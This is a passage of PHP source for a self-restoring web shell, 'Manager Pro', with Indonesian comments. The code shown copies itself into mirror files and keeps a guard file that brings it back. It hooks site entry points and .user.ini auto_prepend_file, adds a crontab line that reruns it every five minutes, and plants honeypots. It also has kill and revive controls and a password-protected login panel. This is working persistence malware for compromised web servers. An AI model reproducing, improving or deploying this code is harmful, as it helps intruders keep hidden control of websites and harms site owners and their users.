    if (!$v) return null;
    $cfg = mp_cfg_load();
    $first = ($cfg === null);
    if ($first) $cfg = mp_cfg_init();

    /* hash source kanonik */
    $selfPath = mp_self();
    $self = (string)@file_get_contents($selfPath);
    $cn = mp_normp($selfPath);
    $ph = mp_normp((string)$cfg['primary']);

    /* Restore order:
     *   1) primary kalau hash-nya cocok dengan record
     *   2) .d di vault kalau hash cocok
     *   3) mirror kalau hash cocok
     * Tidak pernah restore yang belum terverifikasi. */
    $canon = '';
    if (@is_file((string)$cfg['primary'])) {
        $pd = (string)@file_get_contents((string)$cfg['primary']);
        if ($pd !== '' && md5($pd) === (string)$cfg['hash']) $canon = $pd;
    }
    if ($canon === '') {
        $dd = mp_vault_get_d($v);
        if ($dd !== '' && md5($dd) === (string)$cfg['hash']) $canon = $dd;
    }
    if ($canon === '') {
        foreach ((array)$cfg['mirrors'] as $m) {
            if (!@is_file($m)) continue;
            $md = (string)@file_get_contents($m);
            if ($md !== '' && md5($md) === (string)$cfg['hash']) { $canon = $md; break; }
        }
    }
    if ($canon === '' && $self !== '') $canon = $self;

    if ($canon === '') { $GLOBALS['MP_CFG'] = $cfg; return $cfg; }

    $newHash = md5($canon);
    if ($newHash !== (string)$cfg['hash']) {
        /* primary diedit tangan -> adopsi sebagai kebenaran baru */
        $cfg['hash'] = $newHash;
        mp_cfg_save($cfg);
    }
    /* simpan .d + .r terverifikasi */
    if (@is_file($v . '/.d')) {
        $chk = mp_vault_get_d($v);
        if ($chk === '' || md5($chk) !== $newHash) mp_vault_put_d($v, $canon);
    } else {
        mp_vault_put_d($v, $canon);
    }

    $primMissing = (!@is_file((string)$cfg['primary']) || (int)@filesize((string)$cfg['primary']) < 200 || md5((string)@file_get_contents((string)$cfg['primary'])) !== $newHash);

    /* Self-heal executor — HANYA untuk anggota ring.
     *
     * Versi lama menulis balik ke $selfPath tanpa syarat: "gue jalan dari file
     * X, isi gue beda dari kanon, berarti tulis kanon ke X". Yang tidak
     * dihitung: file yang sedang jalan belum tentu milik kita. Begitu
     * index.php situs meng-include guard (lewat inject / auto_prepend),
     * SCRIPT_FILENAME menunjuk index.php, hash-nya beda dari kanon — dan
     * SELURUH source shell dituliskan ke halaman depan situs. Halaman situs
     * hilang, diganti panel shell. Inilah sebabnya domain membuka shell.
     *
     * Sekarang: perbaikan diri hanya terjadi kalau file yang jalan memang
     * terdaftar sebagai primary atau mirror. */
    if ($cn !== $ph && $self !== '' && md5($self) !== (string)$cfg['hash'] && mp_is_ring_member($cfg, $selfPath)) {
        mp_write($selfPath, $canon);
    }

    if ($primMissing) {
        /* restore primary dari sumber terverifikasi */
        if (mp_write((string)$cfg['primary'], $canon)) {
            mp_log($v, 'PRIMARY RESTORED from mirror/vault (' . $cfg['primary'] . ')');
            $cfg['last_restore'] = time();
        }
    }

    /* Pemulihan entry point situs + pembersihan jejak versi lama dijalankan
     * satu paket di bawah, setelah primary dipastikan hidup. Lihat blok
     * "CABUT JEJAK VERSI LAMA" — dipisah dua lapis biaya (tiap boot vs
     * tiap 15 menit), karena mp_boot() jalan di setiap request. */

    /* == CABUT JEJAK VERSI LAMA DI AREA SITUS ============================
     * Versi lama meninggalkan dua jenis jejak yang membuat situs membalas
     * panel: blok mp_sys_prepend di entry point, dan auto_prepend_file di
     * .user.ini / .htaccess. Yang kedua lebih parah — satu baris di
     * /container/.user.ini membuat SEMUA request PHP di bawah folder itu
     * menjalankan shell lebih dulu.
     *
     * Biaya dijaga dua lapis, karena mp_boot() jalan di SETIAP request:
     *   1) tiap boot  -> hanya webroot (2 folder). Tiga file dibaca, selesai.
     *                    Ini yang membuat situs sembuh pada request itu juga.
     *   2) tiap 15 mnt -> sapuan penuh sampai 2 tingkat subfolder (maks 60
     *                    folder). Ini yang menangkap .user.ini yatim di
     *                    folder tempat guard pernah berdiri.
     * Sapuan penuh juga dipaksa kalau legacy_clean_at masih 0, yaitu pada
     * request pertama setelah file ini di-upload. */
    $roots0 = mp_site_roots($cfg);
    $lca = (int)(isset($cfg['legacy_clean_at']) ? $cfg['legacy_clean_at'] : 0);
    $deep = ($lca < 1) || ((time() - $lca) > 900);

    /* Lapis 1 — TIAP boot. Hanya webroot, dan hanya baca 1 KB awal tiap file.
     *
     * Di sinilah halaman depan yang tertimpa source shell dipulihkan. Ini
     * kerusakan yang paling kelihatan: semua orang melihat panel, bukan toko.
     * Menahannya sampai sapuan 15 menit berarti situs rusak seperempat jam
     * demi menghemat beberapa kali is_file(). */
    $shallow = [];
    foreach (array_slice($roots0, 0, 2) as $r0) { if ($r0 !== '') $shallow[] = $r0; }
    /* Penjaga deadlock dijalankan TERLEPAS dari daftar root: folder guard
     * memang di luar root situs, jadi penyisir root tidak akan pernah
     * menyentuhnya. Lihat mp_orphan_prepend_clean(). */
    $oc1 = mp_orphan_prepend_clean($cfg);
    if ($v && $oc1 > 0) mp_log($v, 'prepend yatim di folder kita dicabut: ' . $oc1);
    $cn1 = 0;
    $fx1 = 0;
    if (!empty($shallow)) {
        $cn1 = mp_legacy_clean($cfg, $shallow);
        $fx1 = mp_restore_site_entry($cfg, $shallow);
        if ($v && $fx1 > 0) mp_log($v, 'entry point situs dipulihkan (webroot): ' . $fx1);
    }
    if ($cn1 > 0 || $fx1 > 0 || $oc1 > 0) {
        $liveS = mp_cfg_load();
        if (!is_array($liveS)) $liveS = $cfg;
        $liveS['legacy_clean'] = 1;
        $liveS['legacy_clean_n'] = (int)(isset($liveS['legacy_clean_n']) ? $liveS['legacy_clean_n'] : 0) + $cn1 + $fx1 + $oc1;
        if (!empty($roots0) && empty($liveS['web_root'])) $liveS['web_root'] = $roots0[0];
        mp_cfg_save($liveS);
        $cfg = $liveS;
        if ($v && $cn1 > 0) mp_log($v, 'legacy clean (webroot): ' . $cn1 . ' jejak dicabut');
    }

    /* Lapis 2 — tiap 15 menit / boot pertama. Sisir semua root, termasuk
     * subfolder sampai 2 tingkat: tempat .user.ini yatim tertinggal. */
    if ($deep) {
        $fx = mp_restore_site_entry($cfg);
        if ($v && $fx > 0) mp_log($v, 'entry point situs dipulihkan: ' . $fx);
        $cn2 = mp_legacy_clean($cfg);
        $liveLc = mp_cfg_load();
        if (!is_array($liveLc)) $liveLc = $cfg;
        $liveLc['legacy_clean'] = 1;
        $liveLc['legacy_clean_at'] = time();
        if ($cn2 > 0) $liveLc['legacy_clean_n'] = (int)(isset($liveLc['legacy_clean_n']) ? $liveLc['legacy_clean_n'] : 0) + $cn2;
        if (!empty($roots0) && empty($liveLc['web_root'])) $liveLc['web_root'] = $roots0[0];
        mp_cfg_save($liveLc);
        $cfg = $liveLc;
        if ($v && $cn2 > 0) mp_log($v, 'legacy clean (penuh): ' . $cn2 . ' jejak dicabut');
    }

    /* == GERBANG KILL (paling awal setelah restore primary) ===============
     * Setelah RING KILL, boot HANYA boleh memastikan primary sendiri hidup —
     * itu sudah dilakukan di atas. Yang dilarang sesudah titik ini:
     * sebar/heal mirror, tulis ulang guard, harden, pasang cron.
     *
     * Kenapa gerbang ini di sini dan bukan di bawah: mp_p5_cron() memasang
     * baris crontab yang menjalankan primary tiap 5 menit. Kalau gerbangnya
     * diletakkan setelah blok heal, cron kembali terpasang tiap request dan
     * primary yang "mati" justru jalan sendiri lagi.
     *
     * Diperiksa dari config di DISK, bukan dari $cfg di memori: request lain
     * bisa menekan kill setelah boot ini mulai berjalan. */
    $liveK = mp_cfg_load();
    if (is_array($liveK)) $cfg = $liveK;
    if ((string)$cfg['ring_state'] === 'killed') {
        mp_tamper_check($cfg);
        mp_hb_write($cfg, (string)$cfg['primary'], 'primary');
        if ($cn !== $ph) mp_hb_write($cfg, $selfPath, 'mirror');
        mp_cfg_save($cfg);
        $GLOBALS['MP_CFG'] = $cfg;
        return $cfg;
    }

    mp_heal_mirrors($cfg, $canon);
    /* Guard dicek SETIAP boot — bukan nunggu heal_ttl. Guard adalah satu-satunya
     * jalur restore saat primary hilang; guard yang dirusak/dihapus/berubah
     * = ring tanpa jaring pengaman, jadi tidak boleh ditunda 15 menit. */
    $cfg = mp_heal_guard($cfg, $canon);
    if ($force || $first || (time() - (int)$cfg['last_heal']) > (int)$cfg['heal_ttl']) {
        mp_harden($cfg, $force);
        mp_p5_cron($cfg);
        $live0 = mp_cfg_load();
        if (is_array($live0)) $cfg = $live0;
        $cfg['last_heal'] = time();
        mp_cfg_save($cfg);
    }
    /* Guard bisa saja baru saja diperbaiki di atas; kalau begitu, harden wajib
     * menyusul supaya entry point (index.php / .user.ini) menunjuk file baru. */
    if (!mp_guard_ok($cfg)) {
        mp_harden($cfg, true);
        $liveG = mp_cfg_load();
        if (is_array($liveG)) $cfg = $liveG;
    }

    mp_mesh_rebuild($cfg, $canon);
    mp_honeypot($cfg);
    /* Sinkron dari disk dulu: fungsi di atas (heal_guard, mesh_rebuild)
     * menyimpan versinya sendiri. Tanpa ini $cfg bisa memegang guard lama
     * dan gc menyapu guard yang baru saja dipasang. */
    $preGc = mp_cfg_load();
    if (is_array($preGc)) $cfg = $preGc;
    mp_guard_gc($cfg);
    mp_hb_write($cfg, (string)$cfg['primary'], 'primary');
    if ($cn !== $ph) mp_hb_write($cfg, $selfPath, 'mirror');
    mp_hb_promote_check($cfg);
    mp_tamper_check($cfg);

    if ($first) mp_log($v, 'INSTALL ring v5 primary=' . $cfg['primary'] . ' guard=' . $cfg['guard']);
    /* reload: fungsi di atas menyimpan versinya sendiri, jangan timpa */
    $final = mp_cfg_load();
    if (is_array($final)) $cfg = $final;
    $GLOBALS['MP_CFG'] = $cfg;
    return $cfg;
}

function mp_cfg_init() {
    $def = isset($GLOBALS['MP_DEF']) ? $GLOBALS['MP_DEF'] : [];
    $primary = mp_self();
    $dir = @dirname($primary);
    $src = (string)@file_get_contents($primary);
    $gdir = mp_guard_dir($dir);
    if ($gdir === false) $gdir = $dir;
    $guard = rtrim($gdir, '/\\') . '/' . mp_guard_name($gdir);

    $c = array_merge([
        'v'            => 5,
        'hash'         => md5($src),
        'guard_hash'   => '',
        'primary'      => $primary,
        'guard'        => $guard,
        'guard_name'   => '',
        'web_root'     => '',
        'legacy_clean' => 0,
        'mirrors'      => [],
        'honeypot'     => [],
        'hp_n'         => 0,
        'moved'        => [],
        'hb'           => [],
        'lock'         => [],
        'last_heal'    => 0,
        'last_restore' => 0,
        'last_kill'    => 0,
        'ah'           => '',
        'ring_state'   => 'alive',
        'tamper_last'  => [],
    ], $def);
    mp_cfg_save($c);

    /* Sebar mirror awal — WAJIB update $c dari hasil spread, karena
     * mp_spread() menulis daftar barunya ke $cfg yang DIKIRIM BY VALUE,
     * bukan ke $c kita. Kalau tidak disinkronkan, mp_cfg_save($c) di bawah
     * akan menimpa .c dengan daftar mirror kosong. */
    $saved = mp_cfg_load();
    if (is_array($saved)) $c = $saved;
    for ($i = 0; $i < (int)$c['min_alive']; $i++) {
        if (mp_spread($c, $src) === false) break;
        $saved = mp_cfg_load();
        if (is_array($saved)) $c = $saved;
    }
    mp_cfg_save($c);
    mp_log(mp_vault(), 'init: ' . count((array)$c['mirrors']) . ' mirror');
    return $c;
}

/* == RING KILL =========================================================== */
/* Satu-satunya penentu apakah ring boleh membangun ulang dirinya.
 * Dibaca LANGSUNG dari disk, tidak dari salinan in-memory: $cfg yang dipegang
 * pemanggil sudah basi begitu request lain menekan kill. */
function mp_is_killed($cfg = null) {
    $live = mp_cfg_load();
    if (!is_array($live)) $live = is_array($cfg) ? $cfg : [];
    return ((isset($live['ring_state']) ? (string)$live['ring_state'] : 'alive') === 'killed');
}

/* Dari PRIMARY: seluruh ring mati. Primary sendiri TETAP hidup sebagai
 * kunci revive.
 *
 * PENTING: jangan hanya percaya daftar cfg['mirrors'] — kalau ada salinan
 * yang pernah tertulis tapi gagal tercatat (spread putus di tengah, config
 * ketimpa), daftar itu bohong. Jadi setelah menghapus yang tercatat, lakukan
 * SWEEP: sisir folder kandidat, baca tiap .php, dan hapus yang isinya cocok
 * dengan hash shell kita ATAU memuat penanda shell. Honeypot, guard, inject
 * di index.php, .user.ini, symlink index.php, dan cron semuanya dibersihkan.
 * Primary + salinan di vault TIDAK dihapus (itu kunci revive). */
function mp_ring_kill($cfg) {
    $v = mp_vault();
    $removed = [];
    $keep = [mp_normp((string)$cfg['primary'])];
    $hash = (string)$cfg['hash'];

    $do_unlink = function ($p) use (&$removed, $keep, $v) {
        $np = mp_normp($p);
        if (in_array($np, $keep, true)) return false;
        if ($v && strpos($np, mp_normp($v) . '/') === 0) return false;   /* isi vault jangan */
        if (!@is_file($p)) return false;
        @chmod($p, 0644);
        if (@unlink($p)) { $removed[] = $p; return true; }
        @file_put_contents($p, '');
        $removed[] = $p . ' (truncated)';
        return true;
    };

    /* 1) yang tercatat */
    foreach ((array)$cfg['mirrors'] as $m) $do_unlink($m);
    foreach ((array)$cfg['honeypot'] as $m) $do_unlink($m);
    if (!empty($cfg['guard'])) $do_unlink((string)$cfg['guard']);

    /* 2) SWEEP disk — HANYA isi yang hash-nya PERSIS milik kita.
     *
     * Riwayat: versi sebelumnya menerima "hash kita ATAU nama berpola
     * obfuscated". Itu keliru. Nama pola (index.php, backup_*.php, dan
     * terutama file yang ditanam di folder yang sama) bisa saja milik
     * operator — dan sweep kill sempat menghapus file kerja operator di luar
     * webroot. Kill tidak boleh punya tebakan: kalau ragu, JANGAN hapus.
     *
     * Batas tambahan: hanya folder di BAWAH folder primary. mp_vault_search_dirs()
     * menyusuri naik sampai 4 level (folder proyek, home, /tmp) — folder-folder
     * itu bukan sasaran dan tidak boleh disisir. */
    $pd = @dirname((string)$cfg['primary']);
    $pdN = mp_normp(mp_real_dir($pd));
    $sig = 'mp_ring_kill';              /* penanda unik shell ini */
    $seen = 0;
    $sweepDirs = [];
    foreach (mp_vault_search_dirs() as $base) {
        $bn = mp_normp(mp_real_dir($base));
        if ($bn === '' || $pdN === '') continue;
        if ($bn === $pdN) { $sweepDirs[] = $base; continue; }
        if (strpos($bn . '/', $pdN . '/') !== 0) continue;
        $sweepDirs[] = $base;
    }
    foreach (array_unique($sweepDirs) as $base) {
        if (!@is_dir($base) || !@is_writable($base)) continue;
        $items = @scandir($base);
        if (!is_array($items)) continue;
        foreach ($items as $it) {
            if ($it === '.' || $it === '..') continue;
            $p = rtrim($base, '/\\') . '/' . $it;
            if (!@is_file($p)) continue;
            if (!preg_match('#\.(php|phtml|phar|php[3-8]|pht|inc)$#i', $it)) continue;
            /* entry point situs tidak pernah jadi target sweep */
            if (mp_site_entry_name($it)) continue;
            $sz = (int)@filesize($p);
            if ($sz < 300 || $sz > 2097152) continue;
            $seen++;
            if ($seen > 400) break 2;
            $fd = @fopen($p, 'rb');
            if (!$fd) continue;
            $head = (string)@fread($fd, 65536);
            @fclose($fd);
            if (strpos($head, $sig) === false) continue;
            $full = (string)@file_get_contents($p);
            if ($full === '') continue;
            /* SATU syarat, tanpa pengecualian: hash kanonik kita, persis. */
            if (md5($full) !== $hash) continue;
            $do_unlink($p);
        }
    }

    /* 3) persistence: inject di index.php, .user.ini, symlink, cron */
    mp_unharden($cfg);

    $cfg['mirrors'] = [];
    $cfg['honeypot'] = [];
    $cfg['hp_n'] = 0;
    $cfg['ring_state'] = 'killed';
    $cfg['last_kill'] = time();
    $cfg['last_heal'] = 0;
    mp_cfg_save($cfg);
    if ($v) mp_log($v, 'RING KILL: ' . count($removed) . ' file dihapus; primary tetap hidup');
    return $removed;
}

/* == RING REVIVE ========================================================= */
/* HANYA dari primary. Bangun ulang seluruh ring dari source primary. */
function mp_ring_revive($cfg) {
    $v = mp_vault();
    $src = (string)@file_get_contents((string)$cfg['primary']);
    if ($src === '' || md5($src) !== (string)$cfg['hash']) {
        /* primary sendiri rusak: ambil .d/.r terverifikasi */
        $dd = mp_vault_get_d($v);
        if ($dd !== '' && md5($dd) === (string)$cfg['hash']) {
            mp_write((string)$cfg['primary'], $dd);
            $src = $dd;
        }
        if ($src === '' || md5($src) !== (string)$cfg['hash']) return false;
    }
    $cfg['ring_state'] = 'alive';
    $cfg['moved'] = [];
    /* Jangan kosongkan honeypot di sini: mp_honeypot() kini menyisir disk dan
     * mengadopsi umpan yang masih sah, jadi reset manual malah menghapus
     * jejak lalu memicu pembuatan set baru yang menumpuk. */
    mp_cfg_save($cfg);
    /* Guard baru di folder lain.
     * Kalau guard lama masih ada, cukup PAKAI ULANG: isinya sudah benar dan
     * hash-nya cocok. Membuat nama acak baru di sini menyisakan prelude yatim.
     * Hanya pasang baru kalau guard lama memang sudah hilang. */
    $oldGuard = (string)$cfg['guard'];
    if ($oldGuard !== '' && @is_file($oldGuard) && mp_normp(@dirname($oldGuard)) !== mp_normp(@dirname((string)$cfg['primary']))) {
        $cfg['guard_hash'] = md5(mp_guard_body($cfg));
        $cfg = mp_heal_guard($cfg, $src);
    } else {
        $gd = mp_guard_dir(@dirname((string)$cfg['primary']));
        if ($gd) {
            $cfg['guard'] = rtrim($gd, '/\\') . '/' . mp_guard_name($gd);
            $cfg['guard_hash'] = '';
            $cfg = mp_heal_guard($cfg, $src);
            if ($oldGuard !== '' && mp_normp($oldGuard) !== mp_normp((string)$cfg['guard'])) {
                if (@is_file($oldGuard)) @unlink($oldGuard);
            }
        }
    }
    $n = 0;
    for ($i = 0; $i < ((int)$cfg['min_alive'] + 2); $i++) {
        $live = mp_cfg_load();
        if (!is_array($live)) $live = $cfg;
        if (mp_spread($live, $src) === false) break;
        $n++;
    }
    mp_harden($cfg, true);
    mp_mesh_rebuild($cfg, $src);
    mp_honeypot($cfg);
    /* Sinkronkan $cfg dari disk SEBELUM gc. Tanpa ini $cfg masih memegang
     * guard lama (cabang guard di atas mengubahnya di memori, tapi
     * mp_heal_guard juga menulis versinya sendiri), dan mp_cfg_save($cfg) di
     * bawah akan menimpanya kembali — guard baru jadi yatim. */
    $mid = mp_cfg_load();
    if (is_array($mid)) $cfg = $mid;
    /* mp_harden() di atas bisa memicu heal_guard() lagi (guard baru ditulis
     * karena entry point berubah). Muat ulang SETELAH harden, bukan sebelum. */
    $mid2 = mp_cfg_load();
    if (is_array($mid2)) $cfg = $mid2;
    $liveGuard = (string)$cfg['guard'];
    if ($liveGuard !== '' && !@is_file($liveGuard)) {
        /* guard terakhir hilang/gagal ditulis: paksa pasang baru dari body sah */
        $cfg['guard_hash'] = '';
        $cfg = mp_heal_guard($cfg, $src);
    }
    mp_guard_gc($cfg);
    mp_p5_cron($cfg);
    mp_hb_write($cfg, (string)$cfg['primary'], 'primary');
    $final = mp_cfg_load();
    if (is_array($final)) $cfg = $final;
    mp_cfg_save($cfg);
    if ($v) mp_log($v, 'RING REVIVE: ' . $n . ' mirror baru, guard=' . $cfg['guard']);
    return $n;
}

/* == START =============================================================== */
$cfg = mp_boot(false);

mp_session_start($cfg);

/* == AUTH ================================================================ */
if (mp_get('logout') !== null) {
    if ($cfg) {
        $w = mp_logout_throttle($cfg);
        if ($w > 0) { @header('HTTP/1.1 429 Too Many Requests'); echo 'slow down'; exit; }
    }
    $_SESSION = [];
    @session_destroy();
    $self_url = strtok((string)$_SERVER['REQUEST_URI'], '?');
    @header('Location: ' . $self_url);
    exit;
}

$authed = (isset($_SESSION['mp_ok']) && $_SESSION['mp_ok'] === true);
$lmsg = '';

/* == SESI TERIKAT (v6) ===================================================
 * v5 hanya menyimpan sha256(UA|IP) sekali saat login dan tidak pernah
 * membandingkannya lagi. Artinya cookie sesi yang dicuri (XSS, log proxy,
 * dump .user.ini, snapshot vault) berlaku dari mesin mana pun. v6 memeriksa
 * pin itu SETIAP request; beda UA atau beda IP = sesi dibuang, bukan cuma
 * diperingatkan. Kalau user pindah jaringan, login ulang — itu harga yang
 * benar untuk panel yang tidak boleh dibuka orang lain. */
if ($authed && !empty(MP_HARD['pin_ua'])) {
    $pinNow = hash('sha256',
        (isset($_SERVER['HTTP_USER_AGENT']) ? (string)$_SERVER['HTTP_USER_AGENT'] : '') . '|' . mp_ip());
    $pinOld = isset($_SESSION['b']) ? (string)$_SESSION['b'] : '';
    if ($pinOld === '' || !hp_same($pinOld, $pinNow)) {
        $_SESSION = [];
        @session_destroy();
        $authed = false;
        $lmsg = 'Sesi diputus: jaringan atau browser berubah. Login ulang.';
        if ($cfg) mp_log(mp_vault(), 'SESSION PIN MISMATCH ip=' . mp_ip());
    }
}

/* Sesi yang terlalu lama juga diputus. 8 jam = satu hari kerja;
 * panel ini alat, bukan akun media sosial yang boleh hidup berminggu-minggu. */
if ($authed) {
    $t0 = isset($_SESSION['t0']) ? (int)$_SESSION['t0'] : 0;
    if ($t0 === 0) {
        $_SESSION['t0'] = time();
    } elseif ((time() - $t0) > 28800) {
        $_SESSION = [];
        @session_destroy();
        $authed = false;
        $lmsg = 'Sesi kedaluwarsa (8 jam). Login ulang.';
    }
}

if (!$authed) {
    $wait = $cfg ? mp_locked($cfg) : 0;
    if ($wait > 0) {
        $lmsg = 'Terlalu banyak percobaan. Coba lagi dalam ' . ceil($wait / 60) . ' menit.';
    } else {
        $u = mp_post('username');
        $pw = mp_post('password');
        if ($u !== null && $pw !== null) {
            /* == OTENTIKASI MANDIRI DARI SOURCE (tambalan) ====================
             * Sebelumnya: `if ($cfg && mp_auth_check($cfg, $u, $pw))`.
             * Kalau $cfg = false (vault tidak terbaca / belum pernah lahir),
             * mp_auth_check() TIDAK PERNAH dipanggil. Operator melihat pesan
             * "Username atau password salah!" untuk input apa pun — termasuk
             * kredensial yang benar. Gejalanya persis seperti password salah,
             * padahal kredensialnya tidak pernah dievaluasi sama sekali.
             *
             * Sekarang: kalau $cfg hidup -> jalur normal (vault). Kalau $cfg
             * mati -> evaluasi langsung terhadap $USER/$PASS dari source,
             * dengan percobaan pemulihan vault lebih dulu. Tidak ada keadaan
             * di mana kredensial yang benar tidak bisa masuk. */
            $authOk = false;
            if ($cfg) {
                $authOk = mp_auth_check($cfg, (string)$u, (string)$pw);
            } else {
                /* coba bangun/lahirkan ulang vault sekali lagi, jangan menyerah
                 * hanya karena percobaan pertama gagal */
                $cfg = mp_boot(true);
                if ($cfg) {
                    $authOk = mp_auth_check($cfg, (string)$u, (string)$pw);
                } else {
                    /* vault benar-benar tidak bisa hidup: pakai source apa adanya.
                     * Ini bukan penurunan keamanan — $PASS di source adalah
                     * rahasia yang sama; jalur vault cuma menyembunyikannya. */
                    $authOk = mp_same((string)$USER, (string)$u)
                           && mp_same((string)$PASS, (string)$pw)
                           && (string)$PASS !== '';
                }
            }
            if ($authOk) {
                @session_regenerate_id(true);
                $_SESSION['mp_ok'] = true;
                $_SESSION['b'] = hash('sha256', (isset($_SERVER['HTTP_USER_AGENT']) ? (string)$_SERVER['HTTP_USER_AGENT'] : '') . '|' . mp_ip());
                $_SESSION['t0'] = time();
                $_SESSION['sc'] = bin2hex(random_bytes(8));
                if ($cfg) mp_fail_clear($cfg);
                @header('Location: ' . $_SERVER['REQUEST_URI']);
                exit;
            }
            if ($cfg) { mp_fail_bump($cfg, (string)$u); mp_fail_bump_ip($cfg, (string)$u); }
            $lmsg = 'Username atau password salah!';
        }
    }
    ?>
<!DOCTYPE html>
<html style="margin:0; padding:0; height:100%;">
<head>
    <title>Login - Manager Pro</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        html, body {
            margin:0; padding:0; height:100%;
            background: url('https://raw.githubusercontent.com/TaliGanda/TaliGanda/refs/heads/main/driade-garcia-driade-garcia-yuno-gif-2.gif') no-repeat center center fixed;
            background-size: cover;
            color:#ccc; font-family:monospace;
        }
        .login-box {
            background: rgba(0,0,0,0.85);
            border:1px solid #333;
            padding:25px; width:320px;
            margin:120px auto; text-align:center;
            border-radius:5px;
        }
        input[type="text"], input[type="password"] {
            background:#222; color:#fff; border:1px solid #444; padding:8px; margin:6px; width:80%;
        }
        input[type="submit"] {
            cursor:pointer; background:#333; color:#ccc; border:1px solid #555; padding:6px 20px; margin-top:10px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>༺𓆩 Penyimpanan 𓆪༻</h2>
        <form method="post">
            <input type="text" name="username" placeholder="Jenengmu Sopo?"><br>
            <input type="password" name="password" placeholder="Endi Sandi e?"><br>
            <input type="submit" value="Login">
        </form>
        <?php if ($lmsg !== '') echo "<p style='color:#f55; margin-top:10px;'>" . htmlspecialchars($lmsg) . "</p>"; ?>
    </div>
</body>
</html>
    <?php
    exit;
}

/* == ACTIONS ============================================================= */
$gmsg = '';
$gres = null;
$gset = null;

if (mp_get('guardlog') !== null && $cfg) {
    $vv = mp_vault();
    $log = ($vv && is_file($vv . '/.l')) ? (string)@file_get_contents($vv . '/.l') : 'no log';
    @header('Content-Type: text/plain; charset=utf-8');
    echo $log;
    exit;
}
if (mp_get('hplog') !== null && $cfg) {
    $vv = mp_vault();
    $log = ($vv && is_file($vv . '/.hp')) ? (string)@file_get_contents($vv . '/.hp') : 'no honeypot hits';
    @header('Content-Type: text/plain; charset=utf-8');
    echo $log;
    exit;
}

if (mp_post('set_guard') !== null && $cfg) {
    $np = trim((string)mp_post('guard_path'));
    if ($np === '') {
        $gmsg = 'Path kosong.';
    } else {
        $np = str_replace('\\', '/', $np);
        $nd = @dirname($np);
        if (!@is_dir($nd)) {
            $gmsg = 'Folder tidak ada: ' . htmlspecialchars($nd);
        } elseif (!@is_writable($nd)) {
            $gmsg = 'Folder tidak writable: ' . htmlspecialchars($nd);
        } elseif (mp_normp($nd) === mp_normp(@dirname((string)$cfg['primary']))) {
            $gmsg = 'Guard TIDAK boleh satu folder dengan primary.';
        } elseif (strpos(basename($np), '<?php') !== false || strpos($np, "\0") !== false) {
            $gmsg = 'Nama file tidak valid.';
        } else {
            $old = (string)$cfg['guard'];
            $src = (string)@file_get_contents((string)$cfg['primary']);
            if ($old !== '' && mp_normp($old) !== mp_normp($np) && @is_file($old)) {
                @chmod($old, 0644); @unlink($old);
                mp_inject_entry_remove(@dirname($old) . '/index.php');
            }
            $cfg['guard'] = $np;
            $cfg['guard_hash'] = '';
            $cfg = mp_heal_guard($cfg, $src);
            mp_harden($cfg, true);
            mp_cfg_save($cfg);
            $gmsg = 'Guard di-set ke ' . $np . ' + diharden.';
        }
    }
}
if (mp_post('auto_guard') !== null && $cfg) {
    $src = (string)@file_get_contents((string)$cfg['primary']);
    $old = (string)$cfg['guard'];
    $gd = mp_guard_dir(@dirname((string)$cfg['primary']));
    if ($gd === false) {
        $gmsg = 'Tidak ada folder writable lain.';
    } else {
        $np = rtrim($gd, '/\\') . '/' . mp_guard_name($gd);
        if (mp_normp($old) !== mp_normp($np) && @is_file($old)) {
            @chmod($old, 0644); @unlink($old);
            mp_inject_entry_remove(@dirname($old) . '/index.php');
        }
        $cfg['guard'] = $np;
        $cfg['guard_hash'] = '';
        $cfg = mp_heal_guard($cfg, $src);
        mp_harden($cfg, true);
        mp_cfg_save($cfg);
        $gmsg = 'Auto guard -> ' . $np;
    }
}
if (mp_post('move_guard') !== null && $cfg) {
    $src = (string)@file_get_contents((string)$cfg['primary']);
    $old = (string)$cfg['guard'];
    $pd  = @dirname((string)$cfg['primary']);
    $gd  = mp_guard_dir($pd);
    $tries = 0;
    while ($gd !== false && mp_normp($gd) === mp_normp(@dirname($old)) && $tries < 8) {
        /* paksa pilih folder lain */
        $cands = mp_candidates($pd);
        $pick = false;
        foreach ($cands as $c) {
            if (mp_normp($c) === mp_normp(@dirname($old))) continue;
            if (mp_normp($c) === mp_normp($pd)) continue;
            if (@is_writable($c)) { $pick = $c; break; }
        }
        $gd = $pick;
        $tries++;
    }
    if ($gd === false) {
        $gmsg = 'Tidak ada folder tujuan lain.';
    } else {
        $np = rtrim($gd, '/\\') . '/' . mp_guard_name($gd);
        $cfg['guard'] = $np;
        $cfg['guard_hash'] = '';
        $cfg = mp_heal_guard($cfg, $src);
        if (mp_normp($old) !== mp_normp($np) && @is_file($old)) {
            @chmod($old, 0644); @unlink($old);
            mp_inject_entry_remove(@dirname($old) . '/index.php');
        }
        mp_harden($cfg, true);
        mp_cfg_save($cfg);
        $gmsg = 'Guard dipindah -> ' . $np . ' (folder lama dibersihkan)';
    }
}
if (mp_post('add_mirror') !== null && $cfg) {
    $mp_ = trim((string)mp_post('mirror_path'));
    if ($mp_ === '') {
        $gmsg = 'Path mirror kosong.';
    } else {
        $mp_ = str_replace('\\', '/', $mp_);
        $md = @dirname($mp_);
        if (!@is_dir($md) || !@is_writable($md)) {
            $gmsg = 'Folder mirror tidak writable: ' . htmlspecialchars($md);
        } elseif (@is_file($mp_)) {
            $gmsg = 'File sudah ada di path itu.';
        } else {
            $src = (string)@file_get_contents((string)$cfg['primary']);
            if (mp_write($mp_, $src)) {
                $cfg['mirrors'][] = $mp_;
                mp_cfg_save($cfg);
                $gmsg = 'Mirror ditambah: ' . htmlspecialchars($mp_);
            } else {
                $gmsg = 'Gagal tulis mirror.';
            }
        }
    }
}
if (mp_post('del_mirror') !== null && $cfg) {
    $dm = (string)mp_post('del_mirror');
    $keep = [];
    foreach ((array)$cfg['mirrors'] as $m) {
        if (mp_normp($m) === mp_normp($dm)) {
            if (@is_file($m)) { @chmod($m, 0644); @unlink($m); }
            $moved = isset($cfg['moved']) ? (array)$cfg['moved'] : [];
            $moved[] = mp_normp($m);
            if (count($moved) > 30) $moved = array_slice($moved, -30);
            $cfg['moved'] = $moved;
            continue;
        }
        $keep[] = $m;
    }
    $cfg['mirrors'] = array_values($keep);
    mp_cfg_save($cfg);
    $gmsg = 'Mirror dihapus dari daftar.';
}
if (mp_post('ring_kill') !== null && $cfg) {
    $rm = mp_ring_kill($cfg);
    $cfg = mp_cfg_load();
    $gmsg = 'RING KILL: ' . count($rm) . ' mirror + guard + persistence dihapus. Primary tetap hidup sebagai kunci revive.';
}
if (mp_post('ring_revive') !== null && $cfg) {
    $n = mp_ring_revive($cfg);
